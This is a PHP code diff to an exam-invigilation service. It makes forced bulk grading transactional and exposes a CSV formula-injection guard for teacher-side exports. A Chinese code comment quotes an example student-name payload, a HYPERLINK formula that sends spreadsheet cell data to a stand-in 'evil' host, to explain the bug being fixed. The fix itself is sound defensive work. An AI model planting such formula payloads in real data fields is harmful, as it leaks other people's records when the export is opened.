@@ -73,13 +73,28 @@ final class InvigilationService
         $rows = Database::fetchAll('SELECT stu_id, stu_status FROM `stuscore` WHERE exam_id = ?', [$examId]);
         $graded = 0;
         $skipped = 0;
-        foreach ($rows as $r) {
-            if (str_starts_with((string) ($r['stu_status'] ?? ''), 'over')) {
-                $skipped++;
-                continue;
+        // 全员强制收卷必须原子：autoGrade() 自身虽有幂等门禁（已交卷的会被跳过），
+        // 但此前循环无事务包裹，第 5 名考生判分时抛异常会留下
+        //「前 4 名已封存成绩、其余仍是 online、接口却返回 500」的中间态；
+        // 且重试时前 4 名会被幂等门禁跳过，**无法回滚**，监考员也拿不到实际收了几份。
+        // 写法与 ExamEngine::endExam() 一致；嵌套事务由 Database 的 savepoint 处理
+        // （内层 commit 只 RELEASE SAVEPOINT，外层 rollBack 仍可完整撤销）。
+        Database::beginTransaction();
+        try {
+            foreach ($rows as $r) {
+                if (str_starts_with((string) ($r['stu_status'] ?? ''), 'over')) {
+                    $skipped++;
+                    continue;
+                }
+                ExamEngine::autoGrade($examId, (string) $r['stu_id']);
+                $graded++;
             }
-            ExamEngine::autoGrade($examId, (string) $r['stu_id']);
-            $graded++;
+            Database::commit();
+        } catch (\Throwable $e) {
+            if (Database::inTransaction()) {
+                Database::rollBack();
+            }
+            throw $e;
         }
         return ['graded' => $graded, 'skipped' => $skipped, 'total' => count($rows)];
     }
@@ -207,8 +222,13 @@ final class InvigilationService
      * 考生姓名 / 单位 / 班级等多为导入数据，若以 = + - @ 或制表符、回车开头，
      * Excel / WPS 打开导出文件时会将其当作公式执行（可触发 DDE / 外链请求）。
      * 前置单引号使其恒被识别为文本——仅作用于字符串列，成绩等数值列不受影响。
+     *
+     * 提为 public 供各端导出复用：此前是 private，管理端导出经本类 csv() 受益，
+     * 而教师端导出成绩是独立实现、没走这道防护，姓名为
+     * `=HYPERLINK("http://evil/leak?"&A1,"点我")` 的考生即可在监考教师机器上
+     * 执行公式，而教师端是「批量导出全场」，一次命中即泄露整场（BUG-261）。
      */
-    private static function csvSafe(string $value): string
+    public static function csvSafe(string $value): string
     {
         return preg_match('/^[=+\-@\t\r]/', $value) === 1 ? "'" . $value : $value;
     }
